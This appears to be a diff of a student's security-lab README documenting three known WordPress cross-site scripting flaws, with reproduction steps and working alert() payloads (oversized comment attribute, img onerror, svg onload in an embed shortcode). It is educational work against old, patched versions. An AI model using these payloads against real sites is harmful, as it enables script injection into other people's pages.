@@ -14,11 +14,10 @@ Time spent: 10 hours spent in total
   - [x] GIF Walkthrough: <img src="https://github.com/Charding96/CyberSecur-w7/blob/master/Assignment_1XSS.gif?raw=true" width="800">
   - [x] Steps to recreate: 
     -  Login as Guest
-    - Go on any post down to comment section
-    - post 
-    <a title='x onmouseover=alert(2)style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
-     -  Beware the "A" needs to be 64kbs and over, in order to work. 
-     -  Need admin comment approval.
+    - Go on any post down to comment section 
+    - post <'x onmouseover=alert(2)style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'>
+    -  Beware the "A" needs to be 64kbs and over, in order to work. 
+    -  Need admin comment approval.
           
 2. (Required) WordPress 4.1-4.2.1 - Unauthenticated Genericons Cross-Site Scripting (XSS)
   - [x] Summary: 
@@ -27,10 +26,10 @@ Time spent: 10 hours spent in total
     - Fixed in version: 4.2.2
   - [x] GIF Walkthrough:<img src="https://github.com/Charding96/CyberSecur-w7/blob/master/Assignment_2XSS.gif?raw=true" width="800"> 
   - [x] Steps to recreate: 
-        - Login as admin
-        - Create new post
-        - Post http://www.example.com/wp-content/themes/twentyfifteen/genericons/example.html#1<img/ src=1 onerror= alert('hello')>
-        - Publish and view the post.
+        first Login as admin
+        next Create new post
+        then Post http://www.example.com/wp-content/themes/twentyfifteen/genericons/example.html#1<img/ src=1 onerror= alert('hello')>
+        last Publish and view the post.
         
 3. (Required)WordPress 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
   - [x] Summary: 
@@ -39,10 +38,10 @@ Time spent: 10 hours spent in total
     - Fixed in version:4.7.2 
   - [x] GIF Walkthrough:<img src="https://github.com/Charding96/CyberSecur-w7/blob/master/Assignment_3XSS.gif?raw=true" width="800"> 
   - [x] Steps to recreate: 
-        - Login as admin 
-        - Create new post
-        - Post [embed src='https://www.youtube.com/embed/12345\x3csvg onload=alert("Hello")\x3e'][/embed]
-        - Publish and view the page
+        first Login as admin 
+        next Create new post
+        then Post [embed src='https://www.youtube.com/embed/12345\x3csvg onload=alert("Hello")\x3e'][/embed]
+        last Publish and view the page
 ## Assets
 
 List any additional assets, such as scripts or files
